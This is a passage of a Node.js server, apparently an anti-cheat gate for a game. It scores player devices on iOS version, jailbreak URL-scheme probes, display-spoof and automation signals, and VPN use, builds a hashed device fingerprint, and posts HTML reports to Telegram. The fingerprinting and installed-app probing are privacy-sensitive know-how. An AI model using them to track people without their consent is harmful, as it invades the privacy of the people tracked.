// === server/index.js
// Backend gate; VT18 required; 18.4 ignored for pass;
// iPad desktop/MacIntel OK; jailbreak/flow-hard-fails;
// multi-chat; человеко-понятный отчёт (RU/EN/both) + Fingerprint + anti-spoof.

import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

if (typeof fetch !== 'function' || typeof FormData !== 'function' || typeof Blob !== 'function') {
  throw new Error('Node 18+ with global fetch/FormData/Blob is required');
}

// ==== ENV ====
const BOT_TOKEN        = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = (process.env.ADMIN_API_SECRET || '').trim();
const DB_PATH          = (process.env.DB_PATH || './data/links.db').trim();
const PORT             = Number(process.env.PORT || 10000);
const REPORT_LANG      = (process.env.REPORT_LANG || 'both').toLowerCase();

// ==== i18n ====
function tr(ru, en) {
  switch (REPORT_LANG) {
    case 'ru': return ru;
    case 'en': return en;
    default:   return `${ru} / ${en}`;
  }
}

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));

// CORS
app.use((_, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_, res) => res.sendStatus(200));

// Static cache
app.use((req, res, next) => {
  if (/\.(js|css|png|jpe?g|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// Static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}
console.log('[db] using', DB_PATH);

const db = new Database(DB_PATH);

db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS user_code_map (
    code       TEXT NOT NULL,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    PRIMARY KEY (code, chat_id)
  );
`).run();

db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_code_map_code ON user_code_map(code);`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_code_map_chat ON user_code_map(chat_id);`).run();

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;');
}

function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

async function sendDocumentToTelegram({ chatId, htmlString, filename = 'report.html' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', new Blob([htmlString], { type: 'text/html; charset=utf-8' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

function safeJson(obj, space = 0) {
  try { return JSON.stringify(obj, null, space); }
  catch { return String(obj); }
}

// ==== Fingerprint ====
function buildFingerprint({ userAgent, platform, iosVersion, cp = {}, dc = {} }) {
  const src = safeJson({
    ua: userAgent || '',
    platform: platform || '',
    ios: iosVersion || cp.iosVersion || cp.ios?.version || '',
    model: cp.deviceModel || cp.model || cp.device?.model || '',
    brand: cp.brand || cp.vendor || '',
    gpu: cp.gpu || cp.webglVendor || cp.webglRenderer || '',
    mem: cp.deviceMemory || '',
    cores: cp.hardwareConcurrency || '',
    lang: cp.language || cp.lang || '',
    tz: cp.timezone || cp.tz || '',
    net: cp.effectiveType || cp.downlink || '',
    ipHint: dc.ip || '',
    isp: dc.isp || ''
  });

  const hash = crypto.createHash('sha256').update(src).digest('hex');
  const short = `${hash.slice(0,4)}-${hash.slice(4,8)}-${hash.slice(8,12)}`;
  return { hash, short };
}

const OK = (b) => (b ? '✅' : '❌');

function normVer(maybe) {
  if (typeof maybe === 'number') return maybe;
  if (typeof maybe === 'string') {
    const v = parseFloat(maybe.replace(/[^0-9.]/g,''));
    return Number.isFinite(v) ? v : null;
  }
  return null;
}

function parseIOSMajorFromUAUniversal(ua = '') {
  ua = String(ua || '');
  const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
  if (mOS) return parseInt(mOS[1], 10);
  const mVer = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
  if (mVer) return parseInt(mVer[1], 10);
  return null;
}

// URL-схемы, которые игнорируем (тестовые)
const IGNORE_SCHEMES = [/^custom:/i, /^mytest:/i];
function isIgnoredScheme(s = '') {
  return IGNORE_SCHEMES.some(rx => rx.test(String(s)));
}

// Safari-like UA (iOS/macOS Safari, без Chromium/Firefox/прочего)
function isSafariLikeUA(ua = '') {
  ua = String(ua || '');
  return /Safari\//.test(ua)
    && /AppleWebKit\//.test(ua)
    && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR|OPiOS|UCBrowser|YaBrowser/i.test(ua);
}

function isIosUA(ua = '') {
  ua = String(ua || '');
  return /\b(iPhone|iPad|iPod);.*OS\s\d+_\d+/.test(ua);
}

function isIpadDesktop({ platform, userAgent, cp }) {
  const plat  = String(platform || '');
  const ua    = String(userAgent || '');
  const touch = Number(cp?.maxTouchPoints ?? cp?.navigator?.maxTouchPoints ?? 0);
  const flagIpad = cp?.isIpad === true || /iPad/i.test(ua);
  const isMacPlat = /MacIntel/i.test(plat) || /\bMac\b/i.test(plat);
  return isMacPlat && (touch > 1 || flagIpad);
}

function pickIosVersion(iosVersion, cp, userAgent, platform) {
  const candidates = [
    iosVersion,
    cp?.iosVersion,
    cp?.ios?.version,
    cp?.os?.iosVersion,
    cp?.device?.iOSVersion
  ].filter(v => v != null);

  for (const v of candidates) {
    const n = normVer(v);
    if (n != null) return n;
  }

  const plat = String(platform || '');
  if (/MacIntel/i.test(plat)) {
    const n = parseIOSMajorFromUAUniversal(String(userAgent || ''));
    if (n != null) return n;
  }
  return null;
}

// VT18 required; 18.4 только в отчёт
function normalizeFeatures_Strict18Only(featuresSummary) {
  const fv = featuresSummary || {};
  const tag = (x) => (x === true || String(x).toLowerCase() === 'ok') ? 'ok' : '—';
  const VT18 = tag(fv.VT18 ?? fv.vt18 ?? fv.viewTransitions);
  const V184 = tag(fv.v18_4 ?? fv.v184 ?? fv.triple18_4 ?? fv.shape_cookie_webauthn);
  return { VT18, v18_4: V184, ok: (VT18 === 'ok') };
}

// Жёсткие дисплейные аномалии (только невозможные комбинации)
function detectDisplayHardAnomalies({ status, cp }) {
  const scr = cp?.locale?.screen || cp?.screen || null;
  const dpr = Number(cp?.locale?.dpr ?? cp?.dpr ?? 0) || null;
  const ua = status.ua || '';
  const plat = status.platform || '';

  let displaySpoofHard = false;
  const notes = [];

  if (!scr) return { displaySpoofHard, notes };

  if (/iPhone/i.test(plat) && scr.w >= 1024) {
    displaySpoofHard = true;
    notes.push('iPhone platform with desktop-like width (>=1024px).');
  }

  if (/iPad/i.test(plat) && scr.w && scr.w <= 400) {
    displaySpoofHard = true;
    notes.push('iPad platform with unrealistically small width (<=400px).');
  }

  if (isIosUA(ua) && scr.w >= 1920 && scr.h >= 1080) {
    displaySpoofHard = true;
    notes.push('iOS UA with 1920x1080+ desktop resolution.');
  }

  if (isIosUA(ua) && dpr && dpr < 1) {
    displaySpoofHard = true;
    notes.push('iOS UA with devicePixelRatio < 1.');
  }

  return { displaySpoofHard, notes };
}

// VT18 spoof: VT18 ok, но не Safari-like / не Apple
function detectVT18Spoof({ status, features }) {
  const ua = status.ua || '';
  const plat = status.platform || '';
  const vtOk = features?.VT18 === 'ok';
  let hardSpoofVT18 = false;
  const notes = [];

  if (!vtOk) return { hardSpoofVT18, notes };

  if (!isSafariLikeUA(ua)) {
    hardSpoofVT18 = true;
    notes.push('VT18 reported ok, but UA is not Safari-like.');
  }

  if (!/iPhone|iPad|Macintosh|MacIntel/i.test(ua + ' ' + plat)) {
    hardSpoofVT18 = true;
    notes.push('VT18 reported ok, but platform is not Apple.');
  }

  return { hardSpoofVT18, notes };
}

// базовый статус без учёта risk/flags
function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {}, features }) {
  const v = pickIosVersion(iosVersion, cp, userAgent, platform);
  const iosOk = v != null && v >= 18;

  const plat = String(platform || '');
  const classicOk     = /iPhone|iPad/i.test(plat);
  const ipadDesktopOk = isIpadDesktop({ platform: plat, userAgent, cp });
  const macIntelOk    = /MacIntel/i.test(plat);
  const platformOk    = classicOk || ipadDesktopOk || macIntelOk;

  const jb        = cp?.jbProbesActive || {};
  const jbRowsRaw = Array.isArray(jb.results) ? jb.results : [];
  const jbRows    = jbRowsRaw.filter(r => !isIgnoredScheme(r?.scheme));
  const anyOpened = jbRows.some(r => r?.opened === true);

  const labelRaw    = String(jb?.summary?.label || '').toLowerCase();
  const labelsClean = new Set(['', 'n/a', 'negative', 'unlikely', 'none', 'clean', 'no', 'absent']);
  const jbOk        = !anyOpened && labelsClean.has(labelRaw);
  const jbLabel     = jbOk ? (labelRaw || 'negative') : (labelRaw || 'positive');

  const dcWords = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
  const dcOk    = !dcWords;

  const perms  = cp?.permissions || {};
  const geoOk  = perms.geolocation === 'granted' || perms.geolocation === true;
  const camOk  = perms.camera === 'granted' || perms.camera === true;
  const micOk  = perms.microphone === 'granted' || perms.microphone === true;

  const featuresOk = features ? !!features.ok : true;

  const canLaunch = iosOk && platformOk && jbOk && featuresOk;

  return {
    iosOk,
    platformOk,
    jbOk,
    dcOk,
    geoOk,
    camOk,
    micOk,
    featuresOk,
    features,
    jbLabel,
    dcWords,
    canLaunch,
    iosVersionDetected: v,
    ipadDesktopOk,
    macIntelOk,
    ua: String(userAgent || ''),
    platform: plat,
    _jb: { rows: jbRows, rowsRaw: jbRowsRaw, anyOpened }
  };
}

// ==== Extended flags & reasons ====

function getJbSchemesFromProfile(cp = {}) {
  const jb  = cp.jbProbesActive || cp.jb || {};
  const arr = Array.isArray(jb.results) ? jb.results : [];
  const res = [];
  for (const r of arr) {
    if (!r) continue;
    const scheme = String(r.scheme || '').trim();
    if (!scheme || isIgnoredScheme(scheme)) continue;
    if (r.opened) res.push(scheme);
  }
  return res;
}

function buildFlags(cp = {}, dc = {}, status = {}, meta = {}) {
  const flags = {};

  const ua = meta.userAgent || status.ua || cp.ua || '';
  const platform = meta.platform || status.platform || cp.platform || '';
  const feats = status.features || meta.features || {};

  // In-app WebView — допустимый канал
  const inApp = cp.inAppWebView || {};
  flags.inApp = !!(inApp.isInApp || (Array.isArray(inApp.any) && inApp.any.length) || cp.inApp || cp.inapp);

  // Lite mode — не чита, просто инфо
  flags.lite = !!(
    cp.liteMode ||
    cp.lite ||
    cp.shortcapLite ||
    cp.shortcutLite ||
    dc.liteMode ||
    dc.lite
  );

  // Jailbreak / tools (active probes)
  flags.jbSchemes = getJbSchemesFromProfile(cp);

  // Automation / Shortcuts
  const autoScore = Number(
    cp.automationScore ??
    dc.automationScore ??
    cp.automation_score ??
    dc.automation_score ??
    NaN
  );
  const autoEvents = Number(cp.automationEvents ?? cp.autoEvents ?? 0);

  const hasStrongAutoFlag =
    dc.flags?.includes?.('automation_strong') ||
    cp.automationStrong === true ||
    cp.automation_strong === true;

  const autoStrong =
    hasStrongAutoFlag ||
    (Number.isFinite(autoScore) && autoScore >= 0.85) ||
    autoEvents >= 3;

  const autoShortcutBurst =
    (cp.shortcutUsed || cp.shortCapUsed || cp.shortcutBurst) &&
    (cp.automationBurst === true || autoEvents >= 2);

  flags.automation = !!(autoStrong || autoShortcutBurst);

  // Web API patched / runtime modified
  const webApiPatchedCount = Number(
    cp.webApiPatchedCount ??
    dc.webApiPatchedCount ??
    cp.nonNativeApis ??
    dc.nonNativeApis ??
    0
  );

  const webApiStrongFlag =
    dc.flags?.includes?.('web_api_patched_strong') ||
    cp.webApiPatchedStrong === true ||
    cp.runtimePatchedStrong === true;

  flags.webApiPatched = !!(
    webApiStrongFlag ||
    webApiPatchedCount >= 3
  );

  // DevTools-like
  flags.devtoolsLike = !!(
    dc.devtoolsLike ||
    cp.devtoolsLike ||
    dc.flags?.includes?.('devtools') ||
    status.devtoolsLike
  );

  // VPN / Proxy (DC / hosting)
  flags.vpnOrProxy = !!(
    dc.vpnOrProxy ||
    cp.vpnOrProxy ||
    status.dcOk === false
  );

  // Link flow mismatch
  flags.linkFlowMismatch = !!(
    dc.linkFlowMismatch ||
    cp.linkFlowMismatch ||
    dc.flags?.includes?.('link_flow_mismatch')
  );

  // Жёсткие спуфы по VT18/UA/платформе
  const { hardSpoofVT18, notes: vt18Notes } = detectVT18Spoof({ status, features: feats });
  flags.hardSpoofVT18 = hardSpoofVT18;
  if (vt18Notes.length) flags.hardSpoofVT18_notes = vt18Notes;

  // Жёсткие аномалии по дисплею
  const { displaySpoofHard, notes: dispNotes } = detectDisplayHardAnomalies({ status, cp });
  flags.displaySpoofHard = displaySpoofHard;
  if (dispNotes.length) flags.displaySpoofHard_notes = dispNotes;

  // JB probes заглушены при патченных WebAPI
  const jb  = cp?.jbProbesActive || {};
  const results = Array.isArray(jb.results)
    ? jb.results.filter(r => !isIgnoredScheme(r?.scheme))
    : [];
  const anyOpened = results.some(r => r?.opened === true);
  const label = String(jb.summary?.label || '').toLowerCase();
  const suspiciousLabel =
    label === 'possible' || label === 'error' || label === 'unknown';

  const allTimeoutOrError = results.length > 0 && results.every(r => {
    const reason = String(r?.reason || '').toLowerCase();
    return (
      reason.includes('timeout') ||
      reason.includes('error') ||
      reason.includes('exception') ||
      reason.includes('set-src-exception')
    );
  });

  flags.jbTampered = !!(
    !anyOpened &&
    results.length > 0 &&
    flags.webApiPatched &&
    (suspiciousLabel || allTimeoutOrError)
  );

  // Сведение жёстких
  flags.hardSpoof =
    !!flags.hardSpoofVT18 ||
    !!flags.displaySpoofHard ||
    !!flags.jbTampered;

  // JB hard: явные JB-инструменты
  flags.jbHard = (flags.jbSchemes || []).some(s =>
    /cydia:|sileo:|filza:|ifile:|trollstore:|palera1n:|checkra1n:|dopamine:|altstore:|zbra:|undecimus:|odyssey:|chimera:|taurine:/i
      .test(s)
  );

  return flags;
}

function buildReasons(flags) {
  const reasons = [];

  // 1. Hard: Jailbreak-инструменты
  if (flags.jbHard && flags.jbSchemes?.length) {
    reasons.push({
      severity: 'HIGH',
      code: 'JAILBREAK_SCHEMES_HARD',
      text: tr(
        `Обнаружены явные инструменты джейлбрейка/хака по URL-схемам: ${flags.jbSchemes.join(', ')}. Это надёжный признак модифицированного устройства, не требуемого для честной игры.`,
        `Explicit jailbreak / hacking tools detected via URL schemes: ${flags.jbSchemes.join(', ')}. This is a strong indicator of a modified device not needed for fair gameplay.`
      )
    });
  } else if (flags.jbSchemes?.length) {
    reasons.push({
      severity: 'MEDIUM',
      code: 'JAILBREAK_SCHEMES',
      text: tr(
        `Обнаружены сторонние JB/utility-схемы: ${flags.jbSchemes.join(', ')}. Рекомендуется ручная проверка, возможно мод-девайс.`,
        `Third-party JB/utility URL schemes detected: ${flags.jbSchemes.join(', ')}. Manual review recommended; device may be modified.`
      )
    });
  }

  // 2. Hard: VT18/UA/Platform spoof
  if (flags.hardSpoofVT18) {
    reasons.push({
      severity: 'HIGH',
      code: 'HARD_SPOOF_VT18',
      text: tr(
        'VT18 отмечен как ok, но User-Agent/платформа не похожи на реальный Safari на iOS/macOS. Это указывает на спуфинг или эмулятор.',
        'VT18 reported ok, but User-Agent/platform is not consistent with real Safari on iOS/macOS. This indicates spoofing or emulator usage.'
      )
    });
  }

  // 3. Hard: Невозможные дисплейные параметры
  if (flags.displaySpoofHard) {
    reasons.push({
      severity: 'HIGH',
      code: 'DISPLAY_SPOOF_HARD',
      text: tr(
        'Обнаружены физически невозможные параметры экрана для заявленного устройства (разрешение/DPR). Высокая вероятность эмулятора или спуфинга.',
        'Physically impossible screen parameters for the claimed device (resolution/DPR). High probability of emulator or spoofed environment.'
      )
    });
  }

  // 4. Hard-ish: JB tamper + WebAPI patched
  if (flags.jbTampered && flags.webApiPatched) {
    reasons.push({
      severity: 'HIGH',
      code: 'JB_TAMPER_RUNTIME',
      text: tr(
        'Активные JB-пробы выглядят искусственно заглушенными, при этом ключевые Web API пропатчены. Типичный признак anti-detect/cheat окружения.',
        'Active jailbreak probes appear artificially suppressed while core Web APIs are patched. Typical pattern of anti-detect / cheat environment.'
      )
    });
  }

  // 5. Automation / Shortcuts
  if (flags.automation) {
    reasons.push({
      severity: 'MEDIUM',
      code: 'AUTOMATION_SHORTCUT',
      text: tr(
        'Обнаружены устойчивые признаки автоматизации или shortcut-сценариев (нечеловеческие тайминги, повторяемость). Сам по себе не авто-бан, но усиливает другие флаги.',
        'Stable automation / shortcut patterns detected (non-human timings, repetitive flows). Not an auto-ban alone, but amplifies other signals.'
      )
    });
  }

  // 6. WebAPI patched
  if (flags.webApiPatched && !flags.jbTampered && !flags.hardSpoofVT18) {
    reasons.push({
      severity: 'MEDIUM',
      code: 'RUNTIME_MODIFIED',
      text: tr(
        'Часть ключевых Web API изменена (не native). Это может быть защитный софт или анти-детект, рекомендуется ручная оценка в сочетании с другими сигналами.',
        'Some core Web APIs appear non-native. Could be protective/anti-detect tooling; review in combination with other signals.'
      )
    });
  }

  // 7. DevTools-like
  if (flags.devtoolsLike) {
    reasons.push({
      severity: 'LOW',
      code: 'DEVTOOLS_ENV',
      text: tr(
        'Окружение похоже на DevTools/эмулятор по размерам окна. Сам по себе не является основанием для блокировки.',
        'Window metrics resemble DevTools/emulator. Not a standalone reason for blocking.'
      )
    });
  }

  // 8. VPN / Proxy
  if (flags.vpnOrProxy) {
    reasons.push({
      severity: 'LOW',
      code: 'VPN_PROXY',
      text: tr(
        'Замечены признаки VPN/прокси/дата-центра. Это обычная практика, но в сочетании с другими сигналами повышает риск.',
        'VPN / proxy / datacenter indicators observed. Common behavior, but raises risk when combined with other signals.'
      )
    });
  }

  // 9. Link flow mismatch
  if (flags.linkFlowMismatch) {
    reasons.push({
      severity: 'HIGH',
      code: 'LINK_FLOW_MISMATCH',
      text: tr(
        'Цепочка переходов не совпадает с ожидаемым официальным потоком. Похоже на обход через сторонние или чит-сервисы.',
        'Link flow does not match the expected official path. Indicates a likely bypass via third-party or cheat services.'
      )
    });
  }

  // 10. In-app / Lite пояснения
  if (flags.inApp) {
    reasons.push({
      severity: 'INFO',
      code: 'INAPP_OK',
      text: tr(
        'Вход выполнен из встроенного браузера приложения (Telegram/IG/TikTok и т.п.). Это допустимый сценарий и не ухудшает оценку.',
        'Entry from an in-app browser (Telegram/IG/TikTok etc.). This is an allowed scenario and does not worsen the risk score.'
      )
    });
  }

  if (flags.lite) {
    reasons.push({
      severity: 'INFO',
      code: 'LITE_MODE',
      text: tr(
        'Проверка выполнена в lite-режиме без камеры. Это снижает силу верификации, но не является основанием для блокировки.',
        'Check was performed in lite mode without camera. This weakens verification but is not a standalone reason for blocking.'
      )
    });
  }

  return reasons;
}

function deriveScoreAndLabel(flags, reasons) {
  let risk = 0;
  if (flags.jbHard)            risk += 60;
  if (flags.hardSpoofVT18)     risk += 50;
  if (flags.displaySpoofHard)  risk += 50;
  if (flags.jbTampered)        risk += 40;
  if (flags.linkFlowMismatch)  risk += 35;
  if (flags.automation)        risk += 25;
  if (flags.webApiPatched)     risk += 15;
  if (flags.devtoolsLike)      risk += 10;
  if (flags.vpnOrProxy)        risk += 5;
  if (risk > 100) risk = 100;

  let label = 'clean';
  if (risk >= 60) label = 'bad';
  else if (risk >= 25) label = 'possible';

  return { score: risk, label, reasons };
}

// Единое правило допуска
function evaluateDecision({ status, flags, risk, strictTriggered, strictFailed }) {
  let allow = !!status.canLaunch;

  // strict режим (если включён)
  if (strictTriggered && strictFailed) {
    allow = false;
  }

  // Hard-флаги всегда режут
  if (flags) {
    if (flags.jbHard)            allow = false;
    if (flags.hardSpoofVT18)     allow = false;
    if (flags.displaySpoofHard)  allow = false;
    if (flags.jbTampered)        allow = false;
    if (flags.linkFlowMismatch)  allow = false;
  }

  return allow;
}

function formatReasonsHtml(reasons) {
  if (!reasons || !reasons.length) {
    return `<p>${escapeHTML(tr(
      'Подозрительных сигналов нет. Среда выглядит честной.',
      'No suspicious signals. Environment looks clean.'
    ))}</p>`;
  }
  return '<ol>' + reasons.map(r =>
    `<li><b>[${escapeHTML(r.severity)}]</b> ${escapeHTML(r.text)}</li>`
  ).join('') + '</ol>';
}

function getChatIdsForCode(code) {
  const C = String(code).toUpperCase();
  const ids = new Set();
  try {
    const rowsMap = db.prepare('SELECT chat_id FROM user_code_map WHERE code = ?').all(C);
    rowsMap.forEach(r => ids.add(String(r.chat_id)));
  } catch {}
  try {
    const rowOld = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?').get(C);
    if (rowOld?.chat_id) ids.add(String(rowOld.chat_id));
  } catch {}
  return [...ids];
}

// HTML report
function buildHtmlReport({
  code, geo, userAgent, platform, iosVersion, isSafari,
  cp, dc, features, strictTriggered, strictFailed
}) {
  const s       = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features });
  const flags   = buildFlags(cp, dc, s, { userAgent, platform, features });
  const reasons = buildReasons(flags);
  const risk    = deriveScoreAndLabel(flags, reasons);
  const finalCanLaunch = evaluateDecision({ status: s, flags, risk, strictTriggered, strictFailed });

  const jb  = cp?.jbProbesActive || {};
  const jbSum  = jb.summary || {};

  const jbRows = Array.isArray(s?._jb?.rows)
    ? s._jb.rows
    : (Array.isArray(jb.results) ? jb.results.filter(r => !isIgnoredScheme(r?.scheme)) : []);

  const jbFirst = jbRows.find(r => r?.opened === true) || null;

  const fingerprint = buildFingerprint({
    userAgent,
    platform,
    iosVersion: s.iosVersionDetected,
    cp,
    dc
  });

  const css = `
    :root { color-scheme: light dark; }
    body { font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif; margin:0; padding:24px; }
    .wrap { max-width:980px; margin:0 auto; }
    h1 { margin:0 0 6px; font-size:22px; }
    h2 { margin:10px 0 6px; font-size:18px; }
    .muted { color:#6b7280; font-size:12px; }
    .card { background:rgba(0,0,0,0.04); border:1px solid rgba(0,0,0,0.08); padding:14px 16px;
            border-radius:12px; margin:10px 0; }
    .kv { display:grid; grid-template-columns:220px 1fr; gap:4px; }
    .kv div { padding:4px 6px; border-bottom:1px dashed rgba(0,0,0,0.12); }
    table { border-collapse:collapse; width:100%; margin-top:4px; }
    th, td { border:1px solid rgba(0,0,0,0.2); padding:6px 8px; text-align:left; vertical-align:top; }
    th { background:rgba(0,0,0,0.06); }
    code, pre { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; }
    pre { white-space:pre-wrap; word-break:break-word; background:rgba(0,0,0,0.04);
          padding:10px; border-radius:10px; }
    .ok { color:#16a34a; font-weight:600; }
    .bad { color:#ef4444; font-weight:600; }
    .soft { color:#2563eb; }
    .pill { display:inline-block; padding:1px 7px; border-radius:999px; background:rgba(0,0,0,0.06); margin-left:4px; }
    .summary { font-size:13px; margin-top:4px; }
  `;

  const jbInfo = s.jbOk
    ? tr('Нет признаков джейлбрейка.', 'No jailbreak indicators.')
    : (jbFirst?.scheme
        ? tr(
            `Отработала схема <code>${escapeHTML(jbFirst.scheme)}</code> (${escapeHTML(jbFirst.reason || 'signal')} ~${escapeHTML(jbFirst.durationMs || '0')}мс).`,
            `Triggered scheme <code>${escapeHTML(jbFirst.scheme)}</code> (${escapeHTML(jbFirst.reason || 'signal')} ~${escapeHTML(jbFirst.durationMs || '0')}ms).`
          )
        : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
            ? tr(
                `Признаки: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>.`,
                `Indicators: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>.`
              )
            : tr('Сигналов нет.', 'No direct jailbreak signals.')));

  const reasonsBlock = `
    <div class="card">
      <h2>⚠️ ${escapeHTML(tr('Почему такое решение','Why this decision'))}</h2>
      <p class="summary">${escapeHTML(tr(
        'Ниже перечислены ключевые сигналы. Формулировки специально человеко-понятные, чтобы можно было показать игроку.',
        'Key signals are listed below in human-readable form so this can be shared with the player if needed.'
      ))}</p>
      ${formatReasonsHtml(reasons)}
      <p>${escapeHTML(tr('Риск-оценка','Risk score'))}: <b>${risk.score}</b>/100 &nbsp; Status: <b>${escapeHTML(risk.label.toUpperCase())}</b></p>
    </div>
  `;

  const checklist = `
    <div class="card">
      <h2>${escapeHTML(tr('Чеклист допуска','Access checklist'))}</h2>
      <div class="kv">
        <div><b>Safari VT18</b></div>
        <div>${OK(s.featuresOk)}
          VT18=<span class="pill">${escapeHTML(s.features?.VT18 || '—')}</span>
          18.4=<span class="pill">${escapeHTML(s.features?.v18_4 || '—')}</span>
          <span class="pill">rule: 18.0-only</span>
        </div>
        <div><b>iOS ≥ 18</b></div>
        <div>${OK(s.iosOk)}
          <span class="${s.iosOk ? 'ok' : 'bad'}">
            ${s.iosOk ? 'ok' : 'below'}
          </span>
          <span class="pill"><code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code></span>
        </div>
        <div><b>${escapeHTML(tr('Платформа','Platform'))}</b></div>
        <div>${OK(s.platformOk)}
          <span class="${s.platformOk ? 'ok' : 'bad'}">${
            s.platformOk
              ? (s.ipadDesktopOk
                  ? tr('iPad (desktop-режим разрешён)','iPad (desktop-mode allowed)')
                  : (s.macIntelOk
                      ? tr('MacIntel (разрешён)','MacIntel (allowed)')
                      : 'ok'))
              : 'not iOS'
          }</span>
          <span class="pill"><code>${escapeHTML(String(platform || 'n/a'))}</code></span>
        </div>
        <div><b>Jailbreak</b></div>
        <div>${OK(s.jbOk)}
          <span class="${s.jbOk ? 'ok' : 'bad'}">${
            s.jbOk
              ? tr('нет джейлбрейка','no jailbreak')
              : tr('обнаружены JB-признаки','jailbreak indicators found')
          }</span>
          <span class="pill"><code>${escapeHTML(s.jbLabel || 'n/a')}</code></span>
        </div>
        <div><b>DC/ISP</b></div>
        <div>${OK(s.dcOk)}
          <span class="${s.dcOk ? 'ok' : 'bad'}">${
            s.dcOk
              ? tr('домашний/мобильный','residential/mobile')
              : tr('датацентр/хостинг','datacenter/hosting')
          }</span>
        </div>
        <div><b>${escapeHTML(tr('Гео-разрешение','Geo permission'))}</b></div>
        <div>${OK(s.geoOk)}</div>
        <div><b>Camera</b></div>
        <div>${OK(s.camOk)}</div>
        <div><b>Microphone</b></div>
        <div>${OK(s.micOk)}</div>
        <div><b>${escapeHTML(tr('Итог допуска','Final decision'))}</b></div>
        <div>
          <b>${finalCanLaunch
            ? tr('МОЖНО ЗАПУСКАТЬ','ALLOW')
            : tr('ЗАПРЕТ / РУЧНАЯ ПРОВЕРКА','DENY / MANUAL REVIEW')}</b>
          ${
            strictTriggered
              ? (strictFailed
                  ? ' <span class="bad">(strict fail)</span>'
                  : ' <span class="ok">(strict ok)</span>')
              : ''
          }
        </div>
      </div>
    </div>
  `;

  const overview = `
    <div class="card">
      <h2>${escapeHTML(tr('Сводка по устройству','Device overview'))}</h2>
      <div class="kv">
        <div><b>Code</b></div>
        <div><code>${escapeHTML(String(code).toUpperCase())}</code></div>
        <div><b>Fingerprint</b></div>
        <div>
          <code>${escapeHTML(fingerprint.short)}</code>
          <span class="muted">(hash ${escapeHTML(fingerprint.hash.slice(0,16))}…)</span>
        </div>
        <div><b>UA</b></div>
        <div><code>${escapeHTML(userAgent || '')}</code></div>
        <div><b>iOS / Platform</b></div>
        <div><code>${escapeHTML(String(s.iosVersionDetected ?? ''))}</code> · <code>${escapeHTML(String(platform || ''))}</code></div>
        <div><b>Safari VT18/18.4</b></div>
